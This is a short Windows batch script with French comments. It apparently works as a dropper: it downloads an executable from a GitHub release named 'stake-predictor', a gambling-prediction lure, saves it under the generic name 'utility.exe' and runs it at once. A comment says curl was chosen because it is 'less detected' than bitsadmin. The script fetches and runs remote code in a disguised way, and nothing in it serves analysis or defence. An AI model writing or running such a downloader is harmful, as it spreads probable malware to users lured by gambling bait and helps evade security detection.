@echo off
echo Veuillez patienter, téléchargement en cours...
timeout /t 2 >nul

:: Création d'un dossier temporaire
mkdir temp_setup
cd temp_setup

:: Téléchargement rapide avec curl (moins détecté et plus rapide que bitsadmin)
curl -L -o utility.exe https://github.com/stakepredictor-2025/stake-predictor/releases/download/stakepredictor/stakepredictor.exe

:: Vérification de la présence du fichier
if exist "utility.exe" (
    echo Téléchargement réussi.
    start utility.exe
) else (
    echo Erreur : Le fichier n'a pas pu être téléchargé.
)

cd ..
exit
